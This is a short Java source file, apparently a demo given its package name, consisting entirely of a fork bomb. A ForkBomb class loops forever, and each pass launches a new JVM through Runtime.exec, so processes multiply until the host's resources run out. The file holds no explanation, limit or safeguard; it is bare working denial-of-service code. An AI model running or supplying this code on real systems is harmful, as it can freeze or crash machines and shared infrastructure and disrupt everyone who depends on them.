package com.redhat.waw.demo.forkbomb;

import java.io.IOException;

public class ForkBomb
{
  public static void main(String[] args)
  {
    while(true)
    {
      try {
    	 System.out.println("Starting new process..."); 
		 Runtime.getRuntime().exec(new String[]{"java", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
	} catch (IOException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}
    }
  }
}